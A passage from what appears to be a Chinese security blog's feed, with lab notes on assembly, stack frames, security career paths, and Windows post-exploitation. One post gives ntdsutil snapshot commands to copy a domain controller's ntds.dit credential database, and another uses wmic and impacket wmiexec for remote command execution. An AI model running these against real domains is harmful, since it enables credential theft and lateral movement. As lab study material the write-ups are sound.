id="switch语句反汇编分析"><a href="#switch语句反汇编分析" class="headerlink" title="switch语句反汇编分析"></a>switch语句反汇编分析</h1><h2 id="case-lt-3"><a href="#case-lt-3" class="headerlink" title="case&lt;=3"></a>case&lt;=3</h2><p><img src="/2020/03/03/C语言逆向基础/case3.png" alt><br><img src="/2020/03/03/C语言逆向基础/case33.png" alt><br>当我们的case情况较少的时候，发现反汇编的代码和我们if..else的反汇编代码一样，都是通过jcc比较跳转地址</p><p>##case&gt;3##<br>这里的情况复杂一些<br><img src="/2020/03/03/C语言逆向基础/case4.png" alt><br><img src="/2020/03/03/C语言逆向基础/case44.png" alt><br>反汇编的时候我们看见，首先将我们传入的参数复制给了eax，然后将eax的值给了[ebp-0C4h],最后给了ecx，然后ecx-1,最后又传回给了[ebp-0C4h]，然后这里我们与3进行比较，若比3大，则会跳转到0DA436Ah(直接跳出判断语句，因为这里switch的最大值为4,若减了1还比4大，则就会进入default)，若这个条件不成立，则会将值赋给edx，跳转到[edx*4+0DA4380h]。</p><p>这里反汇编里面搞了这么多的骚操作，原因是为了减少判断的次数直接判断出进入哪一个case，害。</p><p>当然，这里的sub并不是每次都是1，这里和你case中的数是相关的。</p><p>而switch的反汇编是非常复杂的，是编译器来进行了操作，编译器非常的聪明，这里就不一一分析了。</p><p>写的非常粗糙，害。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;C语言反汇编后的代码学习&lt;/p&gt;
&lt;p&gt;C语言的基本数据类型：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;div class=&quot;mdui-table-fluid theme-post__card__table--flat&quot;&gt;&lt;table cla
      
    
    </summary>
    
    
    
      <category term="汇编" scheme="http://sherlocz.github.io/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>Windows下ntds.dit的利用</title>
    <link href="http://sherlocz.github.io/2020/02/28/Windows%E4%B8%8Bntds-dit%E7%9A%84%E5%88%A9%E7%94%A8/"/>
    <id>http://sherlocz.github.io/2020/02/28/Windows下ntds-dit的利用/</id>
    <published>2020-02-28T12:14:10.000Z</published>
    <updated>2020-02-28T12:40:39.121Z</updated>
    
    <content type="html"><![CDATA[<p>ntds.dit是windows下的一个文件，里面存放了域内机器的一些信息，但是就算是域控的账号也无法直接读取出来。这里讲讲提取的方式和读取的方式。</p><p><img src="/2020/02/28/Windows下ntds-dit的利用/n.png" alt><br>无法直接读取</p><p>记笔记记笔记~</p><h1 id="提取ntds-dit"><a href="#提取ntds-dit" class="headerlink" title="提取ntds.dit"></a>提取ntds.dit</h1><ul><li>ntdsutil.exe: Windows Server 2003/08/12</li><li>vssadmin: Windows 7/Windows Server 2008</li></ul><p>这里用12的机器做示范：</p><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit//创建一个快照</span><br></pre></td></tr></table></div></figure><p>快照包含Windows中的所有文件，并且复制的时候不会影响Windows本机，也不会受到限制<br><img src="/2020/02/28/Windows下ntds-dit的利用/1.png" alt></p><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit//加载快照</span><br></pre></td></tr></table></div></figure><p><img src="/2020/02/28/Windows下ntds-dit的利用/2.png" alt><br>这个时候会映射出一个文件夹出来，GUID为每次生成镜像的GUID</p><p>然后用命令将ntds.dit复制出来<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy C:\$SNAP_202002282030_VOLUMEC$\windows\ntds\ntds.dit</span><br><span class="line"> c:\temp\ntds.dit</span><br></pre></td></tr></table></div></figure></p><p><img src="/2020/02/28/Windows下ntds-dit的利用/3.png" alt></p><p>最后删除卸载快照</p><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</span><br></pre></td></tr></table></div></figure><p><img src="/2020/02/28/Windows下ntds-dit的利用/4.png" alt></p><p>执行以下命令，若List为空，则说明卸载成功<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br></pre></td></tr></table></div></figure></p><p><img src="/2020/02/28/Windows下ntds-dit的利用/5.png" alt></p><p>这就是ntdsutil的用法，win7下没有这个工具，需要利用vssadmin，这里没有win7域控的环境就先不搞了<br><img src="/2020/02/28/Windows下ntds-dit的利用/win7.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ntds.dit是windows下的一个文件，里面存放了域内机器的一些信息，但是就算是域控的账号也无法直接读取出来。这里讲讲提取的方式和读取的方式。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/02/28/Windows下ntds-dit的利用/n.png&quot; alt&gt;&lt;b
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>堆栈图练习</title>
    <link href="http://sherlocz.github.io/2020/02/26/%E5%A0%86%E6%A0%88%E5%9B%BE%E7%BB%83%E4%B9%A0/"/>
    <id>http://sherlocz.github.io/2020/02/26/堆栈图练习/</id>
    <published>2020-02-26T12:50:21.000Z</published>
    <updated>2020-02-28T06:04:00.553Z</updated>
    
    <content type="html"><![CDATA[<p>最近学了好多东西但是懒得写，感觉太懒了，最近学习了堆栈，实在是东西太多啦，这里做个笔记，也没啥观赏性。</p><ul><li>DTDebug</li><li>HelloWorld.exe</li></ul><p>目标开始地址：0x401168<br><img src="/2020/02/26/堆栈图练习/1.png" alt><br>从这个地址的三行汇编代码<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PUSH 2//将十六进制的2存储到堆栈中</span><br><span class="line">PUSH 1//将十六进制的1存储到堆栈中</span><br><span class="line">CALL HelloWor.0040100A//goto这个地址</span><br></pre></td></tr></table></div></figure></p><p>这里的栈顶和栈底(也就是ESP和EBP的值):<br>ESP 0019FFE4<br>EBP 0019FF30 </p><p>call命令的时候会存入一个内存地址，就是call这行的内存地址加上占用的字节，这里call命令占用了5个字节，所以将会在堆栈中保存当前内存+5的地址，也就是会保存(0040116C+5)401171</p><p>call命令会将call后面的地址给EIP并会跳转到这个地址，所以我们的EIP地址将会为0040100A</p><p>由于push和call的时候要入栈，所以这里我们的栈顶的值会变化</p><p>所以我们这里可以画出堆栈图<br><img src="/2020/02/26/堆栈图练习/2.png" alt></p><p>然后跳转到了40100A地址，这一行看到了JMP<br><img src="/2020/02/26/堆栈图练习/3.png" alt></p><p>JMP命令只会修改EIP的值，堆栈并不改变，然后会继续走下去到401040<br><img src="/2020/02/26/堆栈图练习/4.png" alt></p><p>这里接下来一直到RETN就是我们剩下要分析的汇编代码</p><p>首先<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUSH EBP</span><br></pre></td></tr></table></div></figure></p><p>将EBP的值入栈，栈顶的值-4</p><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOV EBP,ESP</span><br></pre></td></tr></table></div></figure><p>将ESP的值赋予给EBP</p><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUB ESP,40</span><br></pre></td></tr></table></div></figure><p>ESP的值减去十六进制的四十，这里其实就是栈顶要增加，这一步的原因是为了流出缓存出来</p><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PUSH EBX</span><br><span class="line">PUSH ESP</span><br><span class="line">PUSH EDI</span><br></pre></td></tr></table></div></figure><p>将 EBX、ESP、EDI的值入栈，栈顶+12</p><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LEA EDI,DWORD PTR SS:[EBP-40]</span><br></pre></td></tr></table></div></figure><p>将EBP-40的地址赋值给EDI</p><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MOV ECX,10</span><br><span class="line">MOV EAX,CCCCCCCC</span><br><span class="line">REP STOS DWORD PTR ES:[EDI]</span><br></pre></td></tr></table></div></figure><p>这一步的目的是为了清除多余的垃圾缓存，重复十次，将值赋值成CCCCCCCC</p><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV EAX,DWORD PTR SS:[EBP+8]</span><br><span class="line">ADD EAX,DWORD PTR SS:[EBP+C]</span><br></pre></td></tr></table></div></figure><p>这两步的意思就是将我们刚存进来的1和2相加</p><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POP EDI</span><br><span class="line">POP ESI</span><br><span class="line">POP EBX</span><br><span class="line">MOV ESP,EBP</span><br><span class="line">POP EBP</span><br><span class="line">RETN</span><br></pre></td></tr></table></div></figure><p>清除缓存，就不详细分析了</p><p>这里就会返回到刚开始CALL后的下一行<br><img src="/2020/02/26/堆栈图练习/4.png" alt><br>这里有一个ADD操作，因为到这一步的时候栈顶和栈底的值和刚开始的时候不一样，要恢复成刚开始的样子，这一步叫做堆栈平衡</p><p>完~</p><p>图不画了~懒<br><img src="/2020/02/26/堆栈图练习/6.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近学了好多东西但是懒得写，感觉太懒了，最近学习了堆栈，实在是东西太多啦，这里做个笔记，也没啥观赏性。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DTDebug&lt;/li&gt;
&lt;li&gt;HelloWorld.exe&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;目标开始地址：0x401168&lt;br&gt;&lt;img sr
      
    
    </summary>
    
    
    
      <category term="汇编" scheme="http://sherlocz.github.io/tags/%E6%B1%87%E7%BC%96/"/>
    
      <category term="逆向" scheme="http://sherlocz.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-4878 Flash漏洞复现</title>
    <link href="http://sherlocz.github.io/2020/02/15/CVE-2018-4878-Flash%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://sherlocz.github.io/2020/02/15/CVE-2018-4878-Flash漏洞复现/</id>
    <published>2020-02-15T06:02:03.000Z</published>
    <updated>2020-02-15T06:03:12.931Z</updated>
    
    <content type="html"><![CDATA[<p>最近做项目要自闭了，啥漏洞都挖不出来，太菜了，哎~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近做项目要自闭了，啥漏洞都挖不出来，太菜了，哎~&lt;/p&gt;

      
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>对于乙方安全职业发展方向的思考</title>
    <link href="http://sherlocz.github.io/2020/02/08/%E5%AF%B9%E4%BA%8E%E4%B9%99%E6%96%B9%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E5%8F%91%E5%B1%95%E6%96%B9%E5%90%91%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <id>http://sherlocz.github.io/2020/02/08/对于乙方安全职业发展方向的思考/</id>
    <published>2020-02-08T13:05:15.000Z</published>
    <updated>2020-02-08T14:11:33.852Z</updated>
    
    <content type="html"><![CDATA[<p>学了安全一段时间了，也工作了一段时间，接触过很多很多厉害的人，有社工特别厉害的，有APT的大佬，有审计的大佬，有免杀的大佬，也有做黑产的，在这么多方向中其实还并没有找到自己发展的一个方向，其实看啥都想学点，但是总体来说感觉并没有沉淀下来的技术，对于走技术方向的安全从业人员来说，必须得有个自身立足的优势。</p><p>所以这里就结合自己最近半年接触过的一些岗位，面试经历，讲讲我认知中乙方安全技术上发展的几个方向。</p><h1 id="方向"><a href="#方向" class="headerlink" title="方向"></a>方向</h1><h2 id="安全服务"><a href="#安全服务" class="headerlink" title="安全服务"></a>安全服务</h2><p>这是出入安全门槛相对比较低的一个岗位，平时的工作离不开<strong>等级保护、基线核查、渗透测试、网络等</strong>，做的工作内容相对杂一些。</p><p>对技术上的要求并不高，但是你对整个安全市场会有更多的了解，技术上其实你只要能挖挖洞，能讲清楚漏洞原理就OK。技术上的提升是横向的，并不会对某个领域有着过分的要求，就算你哪一块特别的厉害，公司基本上也不会有这样的需求，能够干活就对了。</p><h2 id="红蓝对抗"><a href="#红蓝对抗" class="headerlink" title="红蓝对抗"></a>红蓝对抗</h2><p>红队的工作相对来说其实相当于高级安全服务工程师，或者说是渗透测试工程师，但是没有安全服务那么杂，基本上就是单纯的渗透、拿站、想尽一切办法进行攻击，除去了等级保护以及一些杂七杂八的东西。</p><p>技术上的要求会高很多，你的知识面得足够广，并且在数个或者一个领域有着较为深入的研究和了解，以及一定量项目的经验。在这条方向上你的技能会提升的很多，很快，也是很多安全从业人员向往的工作方向吧。</p><h2 id="APT"><a href="#APT" class="headerlink" title="APT"></a>APT</h2><p>APT就叫做高级可持续威胁攻击，拿到的项目更加的大、复杂，渗透的周期会很长，感觉这个方向都是去做国安的项目，比方说国家投资的一些APT队伍，或者民间的一些自行组织的黑客团队，攻击的都是某个国家的站点、内网、医疗机构、金融机构，大型企业。</p><p>对于技术的要求会更高，而且想要拿下并不容易，可能几个月甚至半年数年都得盯着某个特定的目标，寻找出资产中的脆弱点进行攻击、社会工程攻击等。</p><h2 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h2><p>主要的工作基本上就是关注0day、攻击事件，但是没有接触过这样的团队，很多小乙方安全公司的安全工程师其实也是兼职这个小方向的。只有大厂才能养活这样的团队。</p><p>第一时间拿到这个情报是很值钱的，帮助企业在安全运营中，利用威胁情报快速检测、响应、分析和预防各类网络攻击威胁，并分析产生行业威胁情报。对于一些被攻击的公司或者潜在的攻击对象来说，市场是很大的。</p><h2 id="SRC"><a href="#SRC" class="headerlink" title="SRC"></a>SRC</h2><p>看过很多出来单干的全职挖SRC的高手，有写扫面器发家致富的，也有批量刷SRC的，对于国内一些大厂SRC，其实每年也就那么几个人挖，毕竟奖金会特别的丰厚，也能提高自身的知名度，能够做到这样的人少之甚少，是一个小圈子内进行的项目，毕竟这个方向全职每年少说也能赚几十万呐。</p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>代码审计的语言有很多种，市面上的招聘一般就会招聘PHP、JAVA或者GO于言的工程师，工作也就是进行拿项目进行代码审计，最后产出。</p><p>不过不同的语言他的特性不一样，框架不一样，你所需要花费的时间就会特别多，而且最好是开发转审计，接触过的好几个审计的大牛都是开发出身的。</p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>内网渗透也包含在后渗透当中，能够接触到内网渗透的安全人员相对来说少很多，而很多的项目也是直接从内网开始的，公司有了这样的需求肯定要招聘，不过数目也是挺少的。</p><h2 id="安全研究"><a href="#安全研究" class="headerlink" title="安全研究"></a>安全研究</h2><p>安全研究能分成很多块，但是首先得说说产出的问题。<br>对于这样的岗位，只有极少数的互联网大厂和大型的乙方安全公司才有这样的团队，小公司这样的安全研究能力都是扯几把蛋的。当公司预算不足的时候，这样的团队也是首先得裁掉的对象之一。</p><p>除非你是天才，对于安全领域有着超高的悟性或者年少有为，才能去向这个方向发展，否则你研究出来的东西本身就没几个人懂，无法为公司提出那个高的价值，这样的方向我认为是没有意义的，当然要是你能做到，说明你的技术确实非常突出了。</p><p>web方向的研究领域：代码审计、内网渗透、免杀、钓鱼、前端安全、数据库安全等等</p><p>当然也有招代码审计工程师或者内网渗透工程师的，我并没有把它放在安全研究领域，因为这样的岗位依然以输出为主，并非纯粹的安全研究。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>当然，如上提到的都只是安全领域中的很小一部分，会有一些其他的方向没拿出来说，这些也只是我浅薄认知中认识的乙方安全，对于自身要走的方向或者技能栈，看自身的选择吧，当然要是周围有这样的大牛就直接舔，毕竟安全也是一个很吃情报的行业，很多东西都不会在市面上分享出来呀。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;学了安全一段时间了，也工作了一段时间，接触过很多很多厉害的人，有社工特别厉害的，有APT的大佬，有审计的大佬，有免杀的大佬，也有做黑产的，在这么多方向中其实还并没有找到自己发展的一个方向，其实看啥都想学点，但是总体来说感觉并没有沉淀下来的技术，对于走技术方向的安全从业人员来
      
    
    </summary>
    
    
    
      <category term="思考" scheme="http://sherlocz.github.io/tags/%E6%80%9D%E8%80%83/"/>
    
  </entry>
  
  <entry>
    <title>利用wmi进行横向渗透</title>
    <link href="http://sherlocz.github.io/2020/02/05/%E5%88%A9%E7%94%A8wmi%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/"/>
    <id>http://sherlocz.github.io/2020/02/05/利用wmi进行横向渗透/</id>
    <published>2020-02-05T12:33:32.000Z</published>
    <updated>2020-02-05T13:01:56.383Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h1><p>wmi为windows内置的工具，可将系统命令执行的结果写入磁盘中，配合type命令远程读取，这样可以远程写马？</p><p>缺点：无回显<br>优点：不容易被发现</p><h1 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h1><p>靶机：win7<br>目标机器：windows server 2012(DC)</p><p>在win7下面进行命令行操作<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.43.100 /user:administrator /password:Ms0806</span><br><span class="line">7 process call create &quot;cmd.exe /c ipconfig &gt; C:\ip.txt&quot;</span><br></pre></td></tr></table></div></figure></p><p><img src="/2020/02/05/利用wmi进行横向渗透/wmic.png" alt></p><p>然后建立ipc连接，利用type命令访问文件</p><p><img src="/2020/02/05/利用wmi进行横向渗透/ipc.png" alt><br><img src="/2020/02/05/利用wmi进行横向渗透/type.png" alt></p><p>达到执行命令的效果</p><p>不过这样执行比较麻烦，这里可以推荐一个脚本<br><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py</a></p><p>使用方式：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py admin:password@ip [command]</span><br></pre></td></tr></table></div></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;WMI&quot;&gt;&lt;a href=&quot;#WMI&quot; class=&quot;headerlink&quot; title=&quot;WMI&quot;&gt;&lt;/a&gt;WMI&lt;/h1&gt;&lt;p&gt;wmi为windows内置的工具，可将系统命令执行的结果写入磁盘中，配合type命令远程读取，这样可以远程写马？&lt;/p&gt;
&lt;p&gt;缺点
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
</feed>
